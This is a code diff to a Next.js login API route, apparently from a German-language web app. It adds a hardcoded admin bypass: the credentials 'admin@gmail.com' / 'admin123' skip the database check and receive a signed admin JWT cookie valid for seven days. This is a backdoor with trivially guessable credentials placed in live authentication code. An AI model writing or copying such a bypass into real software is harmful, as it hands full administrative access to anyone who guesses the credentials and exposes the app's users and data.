@@ -18,6 +18,21 @@ export async function POST(request: Request) {
       return NextResponse.json({ error: 'Benutzername/E-Mail und Passwort erforderlich.' }, { status: 400 });
     }
 
+    // Hardcoded admin bypass
+    if (identifier === 'admin@gmail.com' && password === 'admin123') {
+      const payload = { uid: 'hardcoded-admin', email: 'admin@gmail.com', username: 'admin', role: 'admin', name: 'Admin' };
+      const token = jwt.sign(payload, JWT_SECRET, { expiresIn: '7d' });
+      const response = NextResponse.json(payload, { status: 200 });
+      response.cookies.set('auth_token', token, {
+        httpOnly: true,
+        secure: process.env.NODE_ENV === 'production',
+        sameSite: 'lax',
+        path: '/',
+        maxAge: 60 * 60 * 24 * 7,
+      });
+      return response;
+    }
+
     const client = await MongoClient.connect(uri);
     const db = client.db(dbName);
     
